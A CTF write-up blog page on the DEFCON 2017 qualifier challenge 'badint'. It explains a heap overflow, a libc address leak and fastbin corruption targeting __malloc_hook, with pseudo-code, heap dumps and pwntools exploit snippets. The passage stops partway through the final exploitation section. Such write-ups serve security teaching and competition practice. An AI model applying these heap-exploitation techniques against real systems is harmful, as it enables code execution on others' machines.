<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>DEFCON CTF 2017 Qualifier - badint | kileak</title>





<meta name="description" content="DEFCON CTF 2017 Qualifier - badint">


<meta name="keywords" content="Defcon">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2017/DefconQual-BadInt/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">DEFCON CTF 2017 Qualifier - badint</h1>
      <p class="post-meta">May 1, 2017</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>Enjoy some badint at badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me:21813
<!--break--></p>

  <p>Attachment: <a href="https://kileak.github.io/assets/badint/badint">badint</a> <a href="https://kileak.github.io/assets/badint/libc.so">libc.so</a> <a href="https://kileak.github.io/assets/badint/xpl.py">xpl.py</a></p>

  <p>Team: Samurai</p>
</blockquote>

<figure class="highlight"><pre><code class="language-text" data-lang="text">SEQ #: 0
Offset: 0
Data: AAAABBBB
LSF Yes/No: No
RX PDU [0] [len=4]
SEQ #: 0
Offset: 4
Data: CCCCDDDD
LSF Yes/No: Yes
RX PDU [0] [len=4]
Assembled [seq: 0]: aaaabbbbccccdddd</code></pre></figure>

<p>By playing around with the service, it quickly becomes clear, that we can define different data chunks, which will be put together as soon as we affirm LSF.</p>

<p>Assembling them will create a new chunk and copy the previously defined chunks at the specified offsets into it.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">SEQ #: 0
Offset: 0
Data: AAAABBBB
LSF Yes/No: No
RX PDU [0] [len=4]
SEQ #: 0
Offset: 8
Data: CCCCDDDD
LSF Yes/No: No
RX PDU [0] [len=4]
SEQ #: 0
Offset: 12
Data: EEEEFFFF
LSF Yes/No: Yes
RX PDU [0] [len=4]
Assembled [seq: 0]: aaaabbbb00000000ccccdddd</code></pre></figure>

<p>The binary itself contained quite a lot of functions. Luckily enough, after getting a rough idea of how the chunks are allocated and filled, I took a break on reversing and started playing around with the heap instead. In the end, this worked out pretty well, since it was all about heap corruption.</p>

<p>Stripped pseudo-code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kt">void</span> <span class="nf">inputHandler</span><span class="p">()</span>
<span class="p">{</span>  
  	<span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
  	<span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"SEQ #: "</span><span class="p">);</span>
    	<span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>      
    	<span class="n">seqNo</span> <span class="o">=</span> <span class="n">atol</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>    
    
    	<span class="n">printf</span><span class="p">(</span><span class="s">"Offset: "</span><span class="p">);</span>
    	<span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>      
    	<span class="n">offset</span> <span class="o">=</span> <span class="n">atol</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
    
    	<span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">,</span> <span class="mi">255LL</span><span class="p">);</span>
    	<span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">768</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    
    	<span class="n">inputChunk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">createDataChunk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>

		<span class="n">printf</span><span class="p">(</span><span class="s">"LSF Yes/No: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>
		<span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">768</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="s">"Yes"</span><span class="p">)</span>
			<span class="n">assembleChunks</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		<span class="k">else</span>
			<span class="n">assembleChunks</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 
		<span class="n">printf</span><span class="p">(</span><span class="s">"RX PDU [%d] [len=%d]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">seqNo</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
		<span class="n">createPDUChunk</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">qword_604100</span> <span class="o">+</span> <span class="n">seqNo</span><span class="p">),</span> <span class="n">offset</span><span class="p">,</span> <span class="n">inputChunk</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
		
		<span class="n">delete</span><span class="p">(</span><span class="n">inputChunk</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span> <span class="n">assembleChunks</span> <span class="p">)</span>
		<span class="p">{</span>
	  		<span class="n">finalChunk</span> <span class="o">=</span> <span class="n">assemblePDUs</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">qword_604100</span> <span class="o">+</span> <span class="n">seqNo</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
	  		
	  		<span class="n">printf</span><span class="p">(</span><span class="s">"Assembled [seq: %u]: "</span><span class="p">,</span> <span class="n">seqNo</span><span class="p">);</span>

	  		<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
	    		<span class="n">printf</span><span class="p">(</span><span class="s">"%02x"</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">finalChunk</span> <span class="o">+</span> <span class="n">i</span><span class="p">));</span>

	  		<span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	  		<span class="n">delete</span><span class="p">(</span><span class="n">finalChunk</span><span class="p">);</span>
		<span class="p">}</span>    
  	<span class="p">}</span>  	
<span class="p">}</span></code></pre></figure>

<p>So, when we specify a data chunk, the binary will create an <code class="language-plaintext highlighter-rouge">input chunk</code> and hex-encodes our input into it (<code class="language-plaintext highlighter-rouge">AAAABBBB</code> becomes <code class="language-plaintext highlighter-rouge">0xaaaabbbb</code>). Then it creates a copy of that chunk (<code class="language-plaintext highlighter-rouge">data chunk</code>) and a <code class="language-plaintext highlighter-rouge">pdu chunk</code>, which contains the meta-information for this part of the sequence (offset, pointer to data, …). After creating the <code class="language-plaintext highlighter-rouge">pdu chunk</code>, the initial <code class="language-plaintext highlighter-rouge">input chunk</code> gets freed.</p>

<p>If we specified LSF with “Yes”, it will create a <code class="language-plaintext highlighter-rouge">final chunk</code> and copy the previously entered data into this at the corresponding offsets. Yet it misses to check, if the specified offset is inside the boundaries of this chunk.</p>

<p>This gives us the possibility to overwrite arbitrary values behind the chunk on the heap!</p>

<p>Let’s verify this:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">SEQ #: 0
Offset: 0
Data: AAAABBBBCCCCDDDDEEEEFFFF
LSF Yes/No: No
RX PDU [0] [len=12]

Heap:

0x61a000:	0x0000000000000000	0x0000000000000000
0x61a010:	0x0000000000000000	0x0000000000000000
0x61a020:	0x0000000000000000	0x0000000000000021
0x61a030:	0x0000000000000000	0x00000000ffffeeee	&lt;-- Input Chunk / Final chunk
0x61a040:	0x0000000000000000	0x0000000000000031
0x61a050:	0x0000000000000000	0x0000000000000000	&lt;-- PDU Chunk
0x61a060:	0x0000000000616c28	0x00000000000c0000
0x61a070:	0x000000000061a080	0x0000000000000021
0x61a080:	0xddddccccbbbbaaaa	0x00000000ffffeeee	&lt;-- Data Chunk
0x61a090:	0x0000000000000000	0x000000000001cf71
0x61a0a0:	0x0000000000000000	0x0000000000000000
0x61a0b0:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>For a quick poc, we’ll just overwrite 0x61a090, which is at offset 96 relative to our input chunk (which will serve as <code class="language-plaintext highlighter-rouge">final chunk</code> on assembly, since it gets freed before the <code class="language-plaintext highlighter-rouge">final chunk</code> is allocated and both have the same size)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">SEQ #: 0
Offset: 0
Data: AAAABBBBCCCCDDDDEEEEFFFF
LSF Yes/No: No
RX PDU [0] [len=12]
SEQ #: 0
Offset: 96
Data: AAAABBBBCCCCDDDD
LSF Yes/No: Yes
RX PDU [0] [len=8]
Assembled [seq: 0]: aaaabbbbccccddddeeeeffff0000000000000000

Heap:

0x61a000:	0x0000000000000000	0x0000000000000000
0x61a010:	0x0000000000000000	0x0000000000000000
0x61a020:	0x0000000000000000	0x0000000000000021
0x61a030:	0x0000000000000000	0x00000000ffffeeee	&lt;-- Input Chunk
0x61a040:	0x0000000000000000	0x0000000000000031	
0x61a050:	0x000000000061a090	0x0000000000000000	&lt;-- PDU Chunk
0x61a060:	0x0000000000000000	0x00000000000c0000
0x61a070:	0x000000000061a080	0x0000000000000021
0x61a080:	0xddddccccbbbbaaaa	0x00000000ffffeeee	&lt;-- Data Chunk
0x61a090:	0xddddccccbbbbaaaa	0x0000000000000031	&lt;-- Overwritten
0x61a0a0:	0x0000000000000000	0x000000000061a050
0x61a0b0:	0x0000000000000000	0x0000000000080060
0x61a0c0:	0x000000000061a0d0	0x0000000000000021
0x61a0d0:	0xddddccccbbbbaaaa	0x0000000000000000
0x61a0e0:	0x0000000000000000	0x000000000001cf21
0x61a0f0:	0x0000000000000000	0x0000000000000000
0x61a100:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>So, we have an (almost) arbitrary write on the heap. Since badint allocates and frees a lot of fastbins, fastbin corruption shouldn’t be hard to achieve.</p>

<h2 id="leaking-libc">Leaking libc</h2>

<p>The behaviour for the chunk assembly also introduces an use-after-free vulnerability. The final chunk won’t be zeroed out on creation. Thus, we can define mutliple data chunks at one offset (increasing the size of the final chunk), while letting others uninitialized (thanks to ebeip90 and nilch for pointing that out).</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"># First sequence

SEQ #: 0
Offset: 0
Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
LSF Yes/No: Yes
RX PDU [0] [len=24]
Assembled [seq: 0]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# New sequence

SEQ #: 0
Offset: 12
Data: BBBBBBBBBBBBBBBB
LSF Yes/No: No
RX PDU [0] [len=8]
SEQ #: 0
Offset: 12
Data: BBBBBBBBBBBBBBBB
LSF Yes/No: Yes
RX PDU [0] [len=8]
Assembled [seq: 0]: 0000000000000000aaaaaaaabbbbbbbb	&lt;-- Those a's are remains from the first sequence</code></pre></figure>

<p>We can use that to obtain a libc address. Just need to create a data chunk, whose size is larger than fastbin size. When the <code class="language-plaintext highlighter-rouge">input chunk</code> gets freed, its FD/BK will get populated with pointers to <code class="language-plaintext highlighter-rouge">main_arena</code>. Again, since the <code class="language-plaintext highlighter-rouge">input chunk</code> gets freed before the <code class="language-plaintext highlighter-rouge">final chunk</code> gets allocated, the <code class="language-plaintext highlighter-rouge">final chunk</code> will occupy the same memory area.</p>

<p>With an appropriate offset, we’ll be able to leak the FD pointer.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="p">...</span>

<span class="k">def</span> <span class="nf">sendSeq</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">lsf</span><span class="p">,</span> <span class="n">rec</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">seq</span><span class="p">))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Offset:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Data:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">rec</span><span class="p">):</span>
		<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">lsf</span><span class="p">:</span>
			<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"Yes"</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"No"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak LIBC base"</span><span class="p">)</span>

	<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="s">'B'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">),</span> <span class="bp">True</span><span class="p">)</span>	
	
	<span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0000"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
	
	<span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">))</span>	
	<span class="n">LIBC</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x3be7b8</span></code></pre></figure>

<p>Might be too verbose, but watching the heap should make it easier to understand, what’s happening, while the chunks get assembled.</p>

<p>At first, the <code class="language-plaintext highlighter-rouge">input chunk</code> will be created, and our input gets stored there:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000091	&lt;- Input chunk
0x61ac30:	0x4242424242424242	0x4242424242424242	
0x61ac40:	0x4242424242424242	0x4242424242424242
0x61ac50:	0x4242424242424242	0x4242424242424242
0x61ac60:	0x4242424242424242	0x4242424242424242
0x61ac70:	0x4242424242424242	0x4242424242424242
0x61ac80:	0x4242424242424242	0x4242424242424242
0x61ac90:	0x4242424242424242	0x4242424242424242
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x0000000000000000	0x000000000001c351</code></pre></figure>

<p>After this, it will create the <code class="language-plaintext highlighter-rouge">PDU chunk</code> on the heap, and copy the <code class="language-plaintext highlighter-rouge">input chunk</code> into a new <code class="language-plaintext highlighter-rouge">data chunk</code>:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000091	&lt;- Input chunk
0x61ac30:	0x4242424242424242	0x4242424242424242	
0x61ac40:	0x4242424242424242	0x4242424242424242
0x61ac50:	0x4242424242424242	0x4242424242424242
0x61ac60:	0x4242424242424242	0x4242424242424242
0x61ac70:	0x4242424242424242	0x4242424242424242
0x61ac80:	0x4242424242424242	0x4242424242424242
0x61ac90:	0x4242424242424242	0x4242424242424242
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x0000000000000000	0x0000000000000031	&lt;- PDU chunk
0x61acc0:	0x0000000000000000	0x0000000000000000
0x61acd0:	0x0000000000616c28	0x0000000000800008
0x61ace0:	0x000000000061acf0	0x0000000000000091	&lt;- Data chunk
0x61acf0:	0x4242424242424242	0x4242424242424242	
0x61ad00:	0x4242424242424242	0x4242424242424242
0x61ad10:	0x4242424242424242	0x4242424242424242
0x61ad20:	0x4242424242424242	0x4242424242424242
0x61ad30:	0x4242424242424242	0x4242424242424242
0x61ad40:	0x4242424242424242	0x4242424242424242
0x61ad50:	0x4242424242424242	0x4242424242424242
0x61ad60:	0x4242424242424242	0x4242424242424242
0x61ad70:	0x0000000000000000	0x000000000001c291</code></pre></figure>

<p>It will then free the input chunk and since it’s not a fastbin, it will be put into unsorted bin list and FD/BK will be populated with pointers to <code class="language-plaintext highlighter-rouge">main_arena</code>:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000091
0x61ac30:	0x00007ffff7636b58	0x00007ffff7636b58	&lt;- FD/BK populated
0x61ac40:	0x4242424242424242	0x4242424242424242
0x61ac50:	0x4242424242424242	0x4242424242424242
0x61ac60:	0x4242424242424242	0x4242424242424242
0x61ac70:	0x4242424242424242	0x4242424242424242
0x61ac80:	0x4242424242424242	0x4242424242424242
0x61ac90:	0x4242424242424242	0x4242424242424242
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x0000000000000090	0x0000000000000030  
0x61acc0:	0x0000000000000000	0x0000000000000000
0x61acd0:	0x0000000000616c28	0x0000000000800008
0x61ace0:	0x000000000061acf0	0x0000000000000091
0x61acf0:	0x4242424242424242	0x4242424242424242
0x61ad00:	0x4242424242424242	0x4242424242424242
0x61ad10:	0x4242424242424242	0x4242424242424242
0x61ad20:	0x4242424242424242	0x4242424242424242
0x61ad30:	0x4242424242424242	0x4242424242424242
0x61ad40:	0x4242424242424242	0x4242424242424242
0x61ad50:	0x4242424242424242	0x4242424242424242
0x61ad60:	0x4242424242424242	0x4242424242424242
0x61ad70:	0x0000000000000000	0x000000000001c291</code></pre></figure>

<p>Since we chose to assemble the sequence immediately, it will now allocate the <code class="language-plaintext highlighter-rouge">final chunk</code>. Malloc will serve us the previous <code class="language-plaintext highlighter-rouge">input chunk</code> for that. The assembly function then copies our input from the data pointer to offset 8 in the final chunk, letting FD untouched.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000091
0x61ac30:	0x00007ffff7636b58	0x4242424242424242	&lt;- Final chunk
0x61ac40:	0x4242424242424242	0x4242424242424242
0x61ac50:	0x4242424242424242	0x4242424242424242
0x61ac60:	0x4242424242424242	0x4242424242424242
0x61ac70:	0x4242424242424242	0x4242424242424242
0x61ac80:	0x4242424242424242	0x4242424242424242
0x61ac90:	0x4242424242424242	0x4242424242424242
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x4242424242424242	0x0000000000000031	&lt;- Overwriting prev size
0x61acc0:	0x0000000000000000	0x0000000000000000
0x61acd0:	0x0000000000000000	0x0000000000800008
0x61ace0:	0x000000000061acf0	0x0000000000000091
0x61acf0:	0x4242424242424242	0x4242424242424242
0x61ad00:	0x4242424242424242	0x4242424242424242
0x61ad10:	0x4242424242424242	0x4242424242424242
0x61ad20:	0x4242424242424242	0x4242424242424242
0x61ad30:	0x4242424242424242	0x4242424242424242
0x61ad40:	0x4242424242424242	0x4242424242424242
0x61ad50:	0x4242424242424242	0x4242424242424242
0x61ad60:	0x4242424242424242	0x4242424242424242
0x61ad70:	0x0000000000000000	0x000000000001c291</code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Assembled [seq: 0]: 586b63f7ff7f0000424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242\n</code></pre></figure>

<p>Now that we have the base address of libc, we can start with corrupting the heap in order to get code execution.</p>

<h2 id="fastbin-corruption">Fastbin corruption</h2>

<p>The idea behind fastbin corruption is to overwrite the FD pointer of a freed fastbin with an address of our choice. When this fastbin gets allocated another time, it will put our fake address into the fastbin list. This will mislead malloc into thinking, that there’s another freed fastbin at this address, which could be reused at a following allocation (as long as the fake chunk at this address fulfills some restrictions, that is).</p>

<p>If we succeed in tricking malloc to assume, that our fake address is a valid chunk, we can use this chunk to get an arbitrary write to that address. Used this to overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, which will be called by malloc when allocating new chunks, thus calling our injected address.</p>

<p>Though, overwriting <code class="language-plaintext highlighter-rouge">__malloc_hook</code> is a little bit tricky, since we don’t control the data <em>around</em> it. Just passing the address of <code class="language-plaintext highlighter-rouge">__malloc_hook</code> into the fastbin list will fail, since it doesn’t have a valid size field.</p>

<p>But we can get around this by misaligning our chunk (uafio showed this in <a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">BabyHeap2017</a>)</p>

<p>On allocation of a fastbin, malloc checks, that the size field of the target chunk matches the one of the index of the fastbin.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7fbd777d5720 &lt;__memalign_hook&gt;:   0x00007fbd7749ac90	0x0000000000000000	
0x7fbd777d5730 &lt;__realloc_hook&gt;:    0x00007fbd7749ac30	0x0000000000000000	&lt;- prev size / size
0x7fbd777d5740 &lt;__malloc_hook&gt;:     0x0000000000000000	0x0000000000000000	&lt;- target</code></pre></figure>

<p>If we’d now just pass the address of malloc hook for our fake fastbin, it would interpret <code class="language-plaintext highlighter-rouge">0x7fbd777d5738</code> (=&gt; <code class="language-plaintext highlighter-rouge">0x0</code>) as the chunk size, which will make the malloc checks fail.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7fbd777d572d:	0xbd7749ac30000000	0x000000000000007f	&lt;- Misaligned realloc hook / Fake size (now in fastbin size range)
0x7fbd777d573d:	0x0000000000000000	0x0000000000000000	&lt;- __malloc_hook
0x7fbd777d574d:	0x0000000000000000	0x0000000000000000
0x7fbd777d575d:	0x0000000000000000	0x00006a0000000000</code></pre></figure>

<p>But by misaligning the address to <code class="language-plaintext highlighter-rouge">0x7fbd777d572d</code>, malloc would interpret <code class="language-plaintext highlighter-rouge">0x7f</code> as size, thus passing the checks and allocating this as a fastbin chunk.</p>

<h2 id="exploiting-it">Exploiting it</h2>

<p>So much for the theory, let’s see, how this all can be applied to the challenge service.</p>

<p>First, we’ll need to forge an appropriate heap structure. Since we can only overwrite values behind the <code class="language-plaintext highlighter-rouge">final chunk</code>, we have to make sure that the fastbin, whose values we want to overwrite, is positioned behind it.</p>

<p>To ensure this, I first created a smaller chunk (size <code class="language-plaintext highlighter-rouge">0x16</code>) and then a bigger chunk (size <code class="language-plaintext highlighter-rouge">0x60</code>):</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create fastbin chunks and free them to populate fastbin list"</span><span class="p">)</span>
	
<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x16</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>	
<span class="n">sendSeq</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x60</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Heap after first sequence

0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000021	&lt;- Input/Final buffer of first seq
0x61ac30:	0x0000000000000000	0xaaaaaaaaaaaaaaaa	
0x61ac40:	0x4242aaaaaaaaaaaa	0x0000000000000021
0x61ac50:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa	&lt;- Data buffer
0x61ac60:	0x4242aaaaaaaaaaaa	0x0000000000000051	
0x61ac70:	0x00007ffff7636b58	0x00007ffff7636b58	&lt;- Remains from LIBC leak
0x61ac80:	0x4242424242424242	0x4242424242424242
0x61ac90:	0x4242424242424242	0x4242424242424242
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x0000000000000050	0x0000000000000030	&lt;- PDU chunk
0x61acc0:	0x0000000000000000	0x0000000000000000
0x61acd0:	0x0000000000000000	0x0000000000160000
0x61ace0:	0x000000000061ac50	0x0000000000000091
0x61acf0:	0x4242424242424242	0x4242424242424242	&lt;- Remains from LIBC leak
0x61ad00:	0x4242424242424242	0x4242424242424242
0x61ad10:	0x4242424242424242	0x4242424242424242
0x61ad20:	0x4242424242424242	0x4242424242424242
0x61ad30:	0x4242424242424242	0x4242424242424242
0x61ad40:	0x4242424242424242	0x4242424242424242
0x61ad50:	0x4242424242424242	0x4242424242424242
0x61ad60:	0x4242424242424242	0x4242424242424242
0x61ad70:	0x0000000000000000	0x000000000001c291

Heap after second sequence

0x61ac00:	0x0000000000000000	0x0000000000000000
0x61ac10:	0x0000000000000000	0x0000000000000000
0x61ac20:	0x0000000000000000	0x0000000000000021	&lt;- Input/Final buffer of first seq (small chunk)
0x61ac30:	0x0000000000000000	0xaaaaaaaaaaaaaaaa	
0x61ac40:	0x4242aaaaaaaaaaaa	0x0000000000000021	
0x61ac50:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa	&lt;- Data chunk (first seq)
0x61ac60:	0x4242aaaaaaaaaaaa	0x0000000000000051
0x61ac70:	0x00007ffff7636b98	0x00007ffff7636b98	&lt;- Remains from LIBC leak
0x61ac80:	0x4242424242424242	0x4242424242424242
0x61ac90:	0x4242424242424242	0x4242424242424242
0x61aca0:	0x4242424242424242	0x4242424242424242
0x61acb0:	0x0000000000000050	0x0000000000000030	&lt;- PDU chunk (second seq)
0x61acc0:	0x0000000000000000	0x0000000000000000
0x61acd0:	0x0000000000000000	0x0000000000600000
0x61ace0:	0x000000000061adf0	0x0000000000000091
0x61acf0:	0x4242424242424242	0x4242424242424242	&lt;- Remains from LIBC leak
0x61ad00:	0x4242424242424242	0x4242424242424242
0x61ad10:	0x4242424242424242	0x4242424242424242
0x61ad20:	0x4242424242424242	0x4242424242424242
0x61ad30:	0x4242424242424242	0x4242424242424242
0x61ad40:	0x4242424242424242	0x4242424242424242
0x61ad50:	0x4242424242424242	0x4242424242424242
0x61ad60:	0x4242424242424242	0x4242424242424242
0x61ad70:	0x0000000000000000	0x0000000000000071	&lt;- Final chunk of second seq (big chunk)
0x61ad80:	0x0000000000000000	0xbbbbbbbbbbbbbbbb	&lt;- FD (0x0) of final chunk
0x61ad90:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ada0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61adb0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61adc0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61add0:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x61ade0:	0x0000000000000000	0x0000000000000071	&lt;- Data chunk (second seq)
